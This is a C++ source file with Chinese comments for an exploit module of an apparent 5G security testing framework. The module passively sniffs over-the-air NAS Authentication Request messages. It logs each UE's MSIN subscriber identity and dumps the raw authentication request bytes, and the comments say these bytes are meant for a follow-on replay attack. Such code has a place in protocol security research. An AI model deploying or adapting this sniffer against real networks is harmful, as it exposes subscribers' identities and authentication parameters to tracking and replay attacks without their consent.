/**
 * @file dg_authentication_request_sniffer.cc
 * @brief 被动嗅探模块 —— 捕获 5G NAS 认证请求消息
 *
 * 功能：
 *   - 监听空口上的 NAS Authentication Request (消息类型 0x56)
 *   - 提取并记录 UE 的 MSIN (移动用户标识号，SUCI 的一部分)
 *   - 将完整的认证请求消息以十六进制格式记录到日志
 *
 * 这是一个**纯被动嗅探**模块，不向 dl/ul_buffer_queue 注入任何数据包。
 * 捕获到的认证请求数据可用于后续的重放攻击 (参见 dg_authentication_replay.cc)。
 *
 * 5G 协议背景：
 *   UE 注册流程中，核心网会发送 Authentication Request 给 UE，
 *   其中包含 RAND、AUTN 等认证向量。嗅探该消息可获取认证参数。
 */

#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

class AuthenticationRequestSniffer : public Exploit
{
public:
  AuthenticationRequestSniffer(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
  }

  void setup() override
  {
    // 过滤器：匹配 NAS 5GS Authentication Request 消息 (类型 0x56)
    f_authentication_request = wd_filter("nas_5gs.mm.message_type == 0x56");
    // 字段：提取 MAC-NR 层数据 (用于获取原始字节偏移)
    f_mac_nr = wd_field("mac-nr");
    // 字段：提取 SUCI 中的 MSIN (手机号码的关键部分)
    f_msin = wd_field("nas_5gs.mm.suci.msin");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_authentication_request);
    wd_register_field(wd, f_mac_nr);
    wd_register_field(wd, f_msin);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    // 尝试提取 MSIN —— 即使本包不是 Authentication Request，
    // 也可能是包含 SUCI 的其他 NAS 消息 (如 Registration Request)
    wd_field_info_t msin_info = wd_read_field(wd, f_msin);
    if (msin_info) {
      msin = packet_read_field_string(msin_info);
      logger.info("Received UE identity MSIN: %s", msin.c_str());
    }

    // 如果当前包匹配 Authentication Request 过滤器
    if (wd_read_filter(wd, f_authentication_request)) {
      wd_field_info_t mac_nr_info = wd_read_field(wd, f_mac_nr);
      if (!mac_nr_info) {
        logger.error("Failed to read MAC-NR field");
        return;
      }
      // 从 MAC-NR 层的偏移位置开始，将原始字节转为十六进制字符串输出
      // 这段数据包含完整的认证请求载荷，可直接用于重放攻击
      std::ostringstream oss;
      uint16_t           offset = packet_read_field_offset(mac_nr_info);
      oss << "{";
      for (uint32_t i = offset; i < len; i++) {
        oss << "0x" << std::setfill('0') << std::setw(2) << std::hex << static_cast<int>(buffer[i]) << ", ";
      }
      oss << "};";
      logger.info("MSIN: %s  Auth Request: %s", msin.c_str(), oss.str().c_str());
    }
  }

private:
  wd_filter_t f_authentication_request; ///< NAS Authentication Request 过滤器
  wd_field_t  f_msin;                   ///< MSIN 字段提取器
  wd_field_t  f_mac_nr;                 ///< MAC-NR 层字段 (用于获取数据偏移)
  std::string msin;                     ///< 最近一次捕获到的 MSIN
};

/* 模块工厂函数 */
extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new AuthenticationRequestSniffer(dl_buffer_queue_, ul_buffer_queue_);
}
}
